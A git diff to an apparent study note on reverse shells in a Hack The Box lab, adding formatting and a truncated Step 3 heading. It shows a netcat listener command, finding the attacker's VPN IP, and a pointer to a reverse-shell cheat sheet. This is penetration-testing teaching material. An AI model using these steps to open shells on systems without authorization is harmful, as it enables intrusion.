@@ -16,6 +16,7 @@ An attack where the victim computer initiates the network connection back to the
 ### Setting Up
 #### Step 1: Listener
 We being by setting up a [[netcat]] listener on a port of our choosing:
+
 ```bash
 $ nc -lvnp 1234
 listening on [any] 1234 ...
@@ -23,6 +24,7 @@ listening on [any] 1234 ...
 #### Step 2: Connect Back IP
 We now have a `netcat` listener waiting for a connection, so we can execute the reverse shell command that connects the victim back to us.
 First, we need to find our system's IP so we know where to send the connection:
+
 ```bash
 $ ip a
 ...SNIP... 
@@ -32,7 +34,11 @@ group default qlen 500
 	inet 10.10.10.10/23 scope global tun0 
 ...SNIP...
 ```
+
 > We are connecting to the IP in `tun0` because we can only connect to HTB boxes through the VPN connection, as they do not have internet access. In a real scenario, we may directly connect through `eth0`.
+
+#### Step 3: Reverse Shell Command
+The command we run depends on the victims OS, and what applications we can access. [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) has a 
 
 ---
 ## Bind Shell
